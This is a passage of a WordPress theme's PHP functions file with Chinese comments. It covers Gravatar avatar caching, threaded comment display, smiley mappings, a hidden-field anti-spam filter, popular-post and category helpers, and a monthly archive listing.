        <a href="1">下载面板</a><a href="2">警告面板</a><a href="3">介绍面板</a><a href="4">文本面板</a><a href="5">教程面板</a><a href="6">项目面板</a><a href="7">错误面板</a><a href="8">提问面板</a><a href="9">链接面板</a><a href="10">代码面板</a></li>
      <li class="cfx">
        <p>新版</p>
        <a href="11">下载面板</a><a href="12">警告面板</a><a href="13">介绍面板</a><a href="14">文本面板</a><a href="15">教程面板</a><a href="16">项目面板</a><a href="17">错误面板</a><a href="18">提问面板</a><a href="19">链接面板</a><a href="20">代码面板</a>
      </li>
      <li class="cfx"><a href="21">下载按钮</a><a href="22">爱心图标</a><a href="23">文本图标</a><a href="24">盒子图标</a><a href="25">搜索图标</a><a href="26">文档图标</a><a href="27">链接图标</a><a href="28">箭头图标</a><a href="29">音乐图标</a></li>
      <li class="cfx"><a href="30">音乐</a><a href="31">音乐(可自动播放)</a></li>
      <li class="cfx"><a href="33">优酷</a><a href="34">土豆</a><a href="35">酷6</a><a href="36">音悦台</a></li>
      <li class="cfx"><a href="37">倒计时</a><a href="38">回复可见</a></li>
    </ul>
    <a id="ddm-close" href="#">X</a></div>
</div>
<link rel="stylesheet" href="<?php bloginfo('template_url'); ?>/css/ie7.css" type="text/css" media="all">
<script type="text/javascript" src="<?php bloginfo('template_url'); ?>/js/jquery.ddm.js"></script>	
<?php }

/*=头像
--------------------------------------------------------------------------*/
//自定义头像
add_filter( 'avatar_defaults', 'fb_addgravatar' );
function fb_addgravatar( $avatar_defaults ) {

	$myavatar = get_bloginfo('template_directory') . '/images/gravatar.png';
	$avatar_defaults[$myavatar] = 'freshsky头像';
	return $avatar_defaults;

};
//头像缓存到本地

/*function my_avatar($avatar) {
  $tmp = strpos($avatar, 'http');
  $g = substr($avatar, $tmp, strpos($avatar, "'", $tmp) - $tmp);
  $tmp = strpos($g, 'avatar/') + 7;
  $imgname = substr($g, $tmp, strpos($g, "?", $tmp) - $tmp);
  $tpl_url = get_bloginfo('template_url');
  $random = mt_rand(1, 8);
  $imgsrc = ABSPATH .'avatar/'. $imgname .'.jpg';
  $time = 1209600; //設定14天, 單位:秒
  if ( !is_file($imgsrc) || (time() - filemtime($imgsrc)) > $time ) { //當頭像不存在或文件超過14天才更新
    copy(htmlspecialchars_decode($g), $imgsrc);
  } else  $avatar = strtr($avatar, array($g => $tpl_url.'/avatar/'.$imgname.'.jpg'));
  if (filesize($imgsrc) < 500) copy($tpl_url.'/images/thumbs/avatar-'.$random.'.jpg', $imgsrc);
  return $avatar;
}*/
function my_avatar($email,$size=32,$define_avatar='') {
	$tpl_url = get_bloginfo('template_url');
	$path = 'avatar/';
	$imgname = md5(strtolower($email));
	$a = $path . $imgname .'.jpg';//avatar网头像
	$imgsrc = ABSPATH . $a;
	if (!is_file($imgsrc)){ //当头像不存在就更新
		
		$random = mt_rand(1, 8);
		
		$define_avatar = $tpl_url.'/images/thumbs/avatar-'.$random.'.jpg';//随机头像
		$s = '32'; 
		$r = get_option('avatar_rating');

		$g = 'http://www.gravatar.com/avatar/'.$imgname.'.jpg?s='.$s.'&d='.$define_avatar.'&r='.$r;
	    $avatarContent = @file_get_contents($g);
	    file_put_contents($imgsrc, $avatarContent);
		if ( filesize($imgsrc) == 0 ){ copy($define_avatar, $imgsrc); }
	};
	return get_bloginfo("url").'/'.$a;
}

//add_filter('get_avatar', 'my_avatar');

//制作本地文件夹？
function mkdirs($dir, $mode = 0777){
	if (is_dir($dir) || @mkdir($dir, $mode)) return TRUE;
	if (!mkdirs(dirname($dir), $mode)) return FALSE;
	return @mkdir($dir, $mode);

}

// 评论回复/头像缓存
function weisay_comment($comment, $args, $depth) {
	global $h_option;
   $GLOBALS['comment'] = $comment;
global $commentcount,$wpdb, $post;
     if(!$commentcount) { //初始化楼层计数器
          $comments = $wpdb->get_results("SELECT * FROM $wpdb->comments WHERE comment_post_ID = $post->ID AND comment_type = '' AND comment_approved = '1' AND !comment_parent ");
          $cnt = count($comments);//获取主评论总数量
          $page = get_query_var('cpage');//获取当前评论列表页码
          $cpp=get_option('comments_per_page');//获取每页评论显示数量
         if (ceil($cnt / $cpp) == 1 || ($page > 1 && $page  == ceil($cnt / $cpp))) {
             $commentcount = $cnt + 1;//如果评论只有1页或者是最后一页，初始值为主评论总数
         } else {
             $commentcount = $cpp * $page + 1;
         }
     }
?>
<li <?php comment_class(); ?> id="comment-<?php comment_ID() ?>">
   <article id="div-comment-<?php comment_ID() ?>" class="comment-body">
      <?php $add_below = 'div-comment'; ?>
      <header class="comment-meta comment-author vcard">
		<?php if ($h_option['general']['AvatarCache'] == 1) { ?>
			<?php
				$tpl_url = get_bloginfo('template_url');
				$path = 'avatar/';
				$imgname = md5(strtolower($comment->comment_author_email));
				$a = $path . $imgname .'.jpg';//avatar网头像
				$imgsrc = ABSPATH . $a;
				if (!is_file($imgsrc)){ //当头像不存在就更新
					
					$random = mt_rand(1, 8);
					
					$define_avatar = $tpl_url.'/images/thumbs/avatar-'.$random.'.jpg';//随机头像
					$s = '32'; 
					$r = get_option('avatar_rating');

					$g = 'http://www.gravatar.com/avatar/'.$imgname.'.jpg?s='.$s.'&d='.$define_avatar.'&r='.$r;
	                $avatarContent = @file_get_contents($g);
	                file_put_contents($imgsrc, $avatarContent);
					if ( filesize($imgsrc) == 0 ){ copy($define_avatar, $imgsrc); }
				};
			?>
			<img src='<?php bloginfo('wpurl'); ?>/<?php echo $a ?>' alt='' class='avatar' />
			<?php } else { 
				echo get_avatar( $comment, 32 );
			} ?>
			<div class="floor">
			<?php
				 if(!$parent_id = $comment->comment_parent){
				   switch ($commentcount){
				     case 2 :_e("Sofa", 'freshsky');--$commentcount;break;
				     case 3 :_e("Stool", 'freshsky');--$commentcount;break;
				     case 4 :_e("Floor", 'freshsky');--$commentcount;break;
				     default:printf('%1$s'.__(" Floor", 'freshsky'), --$commentcount);
				   }//end switch
				 }//end if
 			?>
         </div>
         <?php printf( '<cite class="fn">%1$s %2$s</cite>',
						get_comment_author_link(),
						// If current post author is also comment author, make it known visually.
						// 如果现在文章的作者也是评论的作者，显示作者span
						( $comment->user_id === $post->post_author ) ? '<span> ' . __( 'Post author', 'freshsky' ) . '</span>' : ''
					);
			 ?><?php edit_comment_link( __( 'Edit', 'freshsky' ),'&nbsp;:&nbsp;',''); ?>
     
   </header><!-- .comment-meta -->
		<?php if ( '0' == $comment->comment_approved ) : ?>
				<p class="comment-awaiting-moderation"><?php _e( 'Your comment is awaiting moderation.', 'freshsky' ); ?></p>
		<?php endif; ?>
		<?php comment_text() ?>
        
		<span class="datetime">
			<?php 
			printf( '<a href="%1$s"><time datetime="%2$s">%3$s</time></a>',
						esc_url( get_comment_link( $comment->comment_ID ) ),
						get_comment_time( 'c' ),
						/* translators: 1: date, 2: time */
						sprintf( __( '%1$s at %2$s', 'freshsky' ), get_comment_date(), get_comment_time() )
					); 
			 ?>
			</span> <span class="reply"><?php comment_reply_link(array_merge( $args, array('reply_text' => '['.__("Reply").']', 'add_below' =>$add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?></span>
  </article>
<?php
}
function weisay_end_comment() {
		echo '</li>';
}


//评论表情
function smilies_src ($img_src, $img, $siteurl){
return get_bloginfo('template_directory').'/images/smilies/'.$img;
}
add_filter('smilies_src', 'smilies_src',1,20);

//系统表情指向主题表情(修改表情代码_代码1)
add_filter('smilies_src','custom_smilies_src',1,20);
function custom_smilies_src ($img_src, $img, $siteurl){
    return get_bloginfo('template_directory').'/images/smilies/'.$img;
}
//表情代码转换图片(修改表情代码_代码2)
if ( !isset( $wpsmiliestrans ) ) {
	$wpsmiliestrans = array(
				'[/疑问]' => 'icon_question.gif',
				'[/调皮]' => 'icon_razz.gif',
				'[/难过]' => 'icon_sad.gif',
				'[/愤怒]' => 'icon_smile.gif',
				'[/可爱]' => 'icon_redface.gif',
				'[/坏笑]' => 'icon_biggrin.gif',
				'[/惊讶]' => 'icon_surprised.gif',
				'[/发呆]' => 'icon_eek.gif',
				'[/撇嘴]' => 'icon_confused.gif',
				'[/大兵]' => 'icon_cool.gif',
				'[/偷笑]' => 'icon_lol.gif',
				'[/得意]' => 'icon_mad.gif',
				'[/白眼]' => 'icon_rolleyes.gif',
				'[/鼓掌]' => 'icon_wink.gif',
				'[/亲亲]' => 'icon_neutral.gif',
				'[/流泪]' => 'icon_cry.gif',
				'[/流汗]' => 'icon_arrow.gif',
				'[/吓到]' => 'icon_exclaim.gif',
				'[/抠鼻]' => 'icon_evil.gif',
				'[/呲牙]' => 'icon_mrgreen.gif',

				':?:' => 'icon_question.gif',
				':razz:' => 'icon_razz.gif',
				':sad:' => 'icon_sad.gif',
				':evil:' => 'icon_smile.gif',
				':!:' => 'icon_redface.gif',
				':smile:' => 'icon_biggrin.gif',
				':oops:' => 'icon_surprised.gif',
				':grin:' => 'icon_eek.gif',
				':eek:' => 'icon_confused.gif',
				':shock:' => 'icon_cool.gif',
				':???:' => 'icon_lol.gif',
				':cool:' => 'icon_mad.gif',
				':lol:' => 'icon_rolleyes.gif',
				':mad:' => 'icon_wink.gif',
				':twisted:' => 'icon_neutral.gif',
				':roll:' => 'icon_cry.gif',
				':wink:' => 'icon_arrow.gif',
				':idea:' => 'icon_exclaim.gif',
				':arrow:' => 'icon_evil.gif',
				':neutral:' => 'icon_mrgreen.gif',
				':cry:' => 'icon_eek.gif',
				':mrgreen:' => 'icon_razz.gif',
		 );
}

/*=垃圾评论拦截
 ------------------------------*/
class anti_spam {
	function anti_spam() {
	    if ( !current_user_can('level_0') ) {
	      add_action('template_redirect', array($this, 'w_tb'), 1);
	      add_action('init', array($this, 'gate'), 1);
	      add_action('preprocess_comment', array($this, 'sink'), 1);
		}
	  }
	function w_tb() {
    if ( is_singular() ) {
      ob_start(create_function('$input','return preg_replace("#textarea(.*?)name=([\"\'])comment([\"\'])(.+)/textarea>#",
      "textarea$1name=$2w$3$4/textarea><textarea name=\"comment\" cols=\"100%\" rows=\"4\" style=\"display:none\"></textarea>",$input);') );
    }
  }
  function gate() {
    if ( !empty($_POST['w']) && empty($_POST['comment']) ) {
      $_POST['comment'] = $_POST['w'];
    } else {
      $request = $_SERVER['REQUEST_URI'];
      $referer = isset($_SERVER['HTTP_REFERER'])         ? $_SERVER['HTTP_REFERER']         : '隐瞒';
      $IP      = isset($_SERVER["HTTP_X_FORWARDED_FOR"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] . ' (透过代理)' : $_SERVER["REMOTE_ADDR"];
      $way     = isset($_POST['w'])                      ? '手动操作'                       : '未经评论表格';
      $spamcom = isset($_POST['comment'])                ? $_POST['comment']                : null;
      $_POST['spam_confirmed'] = "请求: ". $request. "\n来路: ". $referer. "\nIP: ". $IP. "\n方式: ". $way. "\n內容: ". $spamcom. "\n -- 记录成功 --";
    }
  }
  function sink( $comment ) {
    if ( !empty($_POST['spam_confirmed']) ) {
      if ( in_array( $comment['comment_type'], array('pingback', 'trackback') ) ) return $comment;
      //方法一: 直接挡掉, 將 die(); 前面两斜线刪除即可.
      die();
      //方法二: 标记为 spam, 留在资料库检查是否误判.
      //add_filter('pre_comment_approved', create_function('', 'return "spam";'));
      //$comment['comment_content'] = "[ 小墙判断这是 Spam! ]\n". $_POST['spam_confirmed'];
    }
    return $comment;
	  }
	}
$anti_spam = new anti_spam();

//屏蔽纯英文留言
function scp_comment_post( $incoming_comment ) {
$pattern = '/[一-龥]/u';
if(!preg_match($pattern, $incoming_comment['comment_content'])) {
wp_die( "请使用中文留言!" );
}
return( $incoming_comment );
}
add_filter('preprocess_comment', 'scp_comment_post');

// 获得热评文章
function simple_get_most_viewed($posts_num=10, $days=90){
    global $wpdb;
    $sql = "SELECT ID , post_title , comment_count
            FROM $wpdb->posts
           WHERE post_type = 'post' AND TO_DAYS(now()) - TO_DAYS(post_date) < $days
		   AND ($wpdb->posts.`post_status` = 'publish' OR $wpdb->posts.`post_status` = 'inherit')
           ORDER BY comment_count DESC LIMIT 0 , $posts_num ";
    $posts = $wpdb->get_results($sql);
    $output = "";
    foreach ($posts as $post){
        $output .= "\n<li><a href= \"".get_permalink($post->ID)."\" rel=\"bookmark\" title=\"".$post->post_title." (".$post->comment_count.__("% Comments").")\" >". mb_strimwidth($post->post_title,0,36)."</a></li>";
    }
    echo $output;
}





//获取根分类
function get_category_root_id($cat){

	$this_category = get_category($cat);   // 取得当前分类
	while($this_category->category_parent) // 若当前分类有上级分类时，循环
	{
	$this_category = get_category($this_category->category_parent); // 将当前分类设为上级分类（往上爬）
	}
	return $this_category->term_id; // 返回根分类的id号
}

//获取子分类
function MY_get_category_children($id = '',$link = true,$separator = '/',$id_find=false, $visited = array()){
_deprecated_function( __FUNCTION__, '2.8', 'get_term_children()' );
global $cat;
if($id == '')$id = $cat;
$chain = '';
/** TODO: consult hierarchy */
$cat_ids = get_all_category_ids();
foreach ( (array) $cat_ids as $cat_id ) {
if ( $cat_id == $id )continue;
$category = get_category( $cat_id );
if ( is_wp_error( $category ) )return $category;
if ( $category->parent == $id && !in_array( $category->term_id, $visited ) ) {
$visited[] = $category->term_id;
$category_id = $category->term_id;
$category_name = $category->name;
$category_link = get_category_link( $category_id );
if($link){
	$chain .= '<a href="'.$category_link.'">'.$category_name.'</a>'.$separator;
} elseif ($id_find) {
	$chain .= $category_id.$separator;
}else{

 $chain .= $category_name.$separator;
}
$chain .= MY_get_category_children( $category_id,$link,$separator,$visited );
}
}
return $chain;
}
function MY_the_category_children($id = '',$link = true,$separator = '/',$visited = array()){
echo MY_get_category_children($id,$link,$separator,$visited);
}
//////////////////////////////////////wordpress啦

     function get_category_tags($args) {
        global $wpdb;
        $tags = $wpdb->get_results
        ("
            SELECT DISTINCT terms2.term_id as tag_id, terms2.name as tag_name, null as tag_link
            FROM
                wp_posts as p1
                LEFT JOIN wp_term_relationships as r1 ON p1.ID = r1.object_ID
                LEFT JOIN wp_term_taxonomy as t1 ON r1.term_taxonomy_id = t1.term_taxonomy_id
                LEFT JOIN wp_terms as terms1 ON t1.term_id = terms1.term_id,

                wp_posts as p2
                LEFT JOIN wp_term_relationships as r2 ON p2.ID = r2.object_ID
                LEFT JOIN wp_term_taxonomy as t2 ON r2.term_taxonomy_id = t2.term_taxonomy_id
                LEFT JOIN wp_terms as terms2 ON t2.term_id = terms2.term_id
            WHERE
                t1.taxonomy = 'category' AND p1.post_status = 'publish' AND terms1.term_id IN (".$args['categories'].") AND
                t2.taxonomy = 'post_tag' AND p2.post_status = 'publish'
                AND p1.ID = p2.ID
            ORDER by tag_name
        ");
        $count = 0;
        foreach ($tags as $tag) {
            $tags[$count]->tag_link = get_tag_link($tag->tag_id);
            $count++;
        }
        return $tags;
    }

//为页面添加钩子
add_action( 'init', 'boj_add_excerpts_to_pages' );

function boj_add_excerpts_to_pages() {
add_post_type_support( 'page', array( 'excerpt' ) );
}
//Html5验证中的rel category
function the_category_filter($thetag){
    return preg_replace('/rel=".*?"/','rel="tag"',$thetag);
  }
add_filter('the_category','the_category_filter');

//自动添加标签属性 
//add_filter('the_content', 'pirobox_gall_replace');   
function pirobox_gall_replace ($content)   
{   global $post;  
    $pattern = "/<a(.*?)href=('|\")([^>]*).(bmp|gif|jpeg|jpg|png)('|\")(.*?)>(.*?)<\/a>/i";   
    $replacement = '<a$1href=$2$3.$4$5 class="pirobox_gall"$6>$7</a>';   
    $content = preg_replace($pattern, $replacement, $content);   
    return $content;   
}  


//自定义样式
function custom_login() {
	echo '<link rel="stylesheet" type="text/css" href="' . get_bloginfo('template_directory') . '/css/login.css" />';
}
add_action('login_head', 'custom_login');

//自定义登陆地址
add_filter( 'login_headerurl', 'custom_loginlogo_url' );
function custom_loginlogo_url($url){
	return get_bloginfo("url");
}


//这里视频的工具，请php curl_init函数用法
/**
 * [img]图片src / [title]视频标题 / [url]视频地址html 
 * [swf]视频swf / [object]视频代码 
 */
function get_video_data($url = null){
	$abc = new VideoUrlParser();
	$video_data = $abc->parse($url);//获取视频的数组
	return $video_data;
}


/*=日志归档
-----------------------------------------------------------------------------------*/

	class hacklog_archives
{
	function GetPosts() 
	{
		global  $wpdb;
		if ( $posts = wp_cache_get( 'posts', 'ihacklog-clean-archives' ) )
			return $posts;
		$query="SELECT DISTINCT ID,post_date,post_date_gmt,comment_count,comment_status,post_password FROM $wpdb->posts WHERE post_type='post' AND post_status = 'publish' AND comment_status = 'open'";
		$rawposts =$wpdb->get_results( $query, OBJECT );
		foreach( $rawposts as $key => $post ) {
			$posts[ mysql2date( 'Y.m', $post->post_date ) ][] = $post;
			$rawposts[$key] = null; 
		}
		$rawposts = null;
		wp_cache_set( 'posts', $posts, 'ihacklog-clean-archives' );;
		return $posts;
	}
	function PostList( $atts = array() ) 
	{
		global $wp_locale;
		global $hacklog_clean_archives_config;
		$atts = shortcode_atts(array(
			'usejs'        => $hacklog_clean_archives_config['usejs'],
			'monthorder'   => $hacklog_clean_archives_config['monthorder'],
			'postorder'    => $hacklog_clean_archives_config['postorder'],
			'postcount'    => '1',
			'commentcount' => '1',
		), $atts);
		$atts=array_merge(array('usejs'=>1,'monthorder'   =>'new','postorder'    =>'new'),$atts);
		$posts = $this->GetPosts();
		( 'new' == $atts['monthorder'] ) ? krsort( $posts ) : ksort( $posts );
		foreach( $posts as $key => $month ) {
			$sorter = array();
			foreach ( $month as $post )
				$sorter[] = $post->post_date_gmt;
			$sortorder = ( 'new' == $atts['postorder'] ) ? SORT_DESC : SORT_ASC;
			array_multisort( $sorter, $sortorder, $month );
			$posts[$key] = $month;
			unset($month);
		}
		$html = '<div class="car-container';
		if ( 1 == $atts['usejs'] ) $html .= ' car-collapse';
		$html .= '">'. "\n";
		if ( 1 == $atts['usejs'] ) $html .= '<a href="#" class="car-toggler">展开所有月份'."</a>\n\n";
		$html .= '<ul class="car-list">' . "\n";
		$firstmonth = TRUE;
		foreach( $posts as $yearmonth => $posts ) {
			list( $year, $month ) = explode( '.', $yearmonth );
			$firstpost = TRUE;
			foreach( $posts as $post ) {
				if ( TRUE == $firstpost ) {
                    $spchar = $firstmonth ? '<span class="car-toggle-icon car-minus">-</span>' : '<span class="car-toggle-icon car-plus">+</span>';
					$html .= '	<li><span class="car-yearmonth" style="cursor:pointer;">'.$spchar.' ' . sprintf( __('%1$s %2$d'), $wp_locale->get_month($month), $year );
					if ( '0' != $atts['postcount'] ) 
					{
						$html .= ' <span title="文章数量">(共' . count($posts) . '篇文章)</span>';
					}
                    if ($firstmonth == FALSE) {
					$html .= "</span>\n		<ul class='car-monthlisting' style='display:none;'>\n";
                    } else {
                    $html .= "</span>\n		<ul class='car-monthlisting'>\n";
                    }
					$firstpost = FALSE;
                     $firstmonth = FALSE;
				}
				$html .= '			<li>' .  mysql2date( 'd', $post->post_date ) . '日: <a target="_blank" href="' . get_permalink( $post->ID ) . '">' . get_the_title( $post->ID ) . '</a>';
				if ( '0' != $atts['commentcount'] && ( 0 != $post->comment_count || 'closed' != $post->comment_status ) && empty($post->post_password) )
					$html .= ' <span title="评论数量">(' . $post->comment_count . '条评论)</span>';
				$html .= "</li>\n";
			}
			$html .= "		</ul>\n	</li>\n";
		}
		$html .= "</ul>\n</div>\n";
		return $html;
	}
	function PostCount() 
	{
		$num_posts = wp_count_posts( 'post' );
		return number_format_i18n( $num_posts->publish );
	}
}
if(!empty($post->post_content))
{
	$all_config=explode(';',$post->post_content);
	foreach($all_config as $item)
	{
		$temp=explode('=',$item);
		$hacklog_clean_archives_config[trim($temp[0])]=htmlspecialchars(strip_tags(trim($temp[1])));
	}
}
else
{
	$hacklog_clean_archives_config=array('usejs'=>1,'monthorder'   =>'new','postorder'    =>'new');	
}
$hacklog_archives=new hacklog_archives();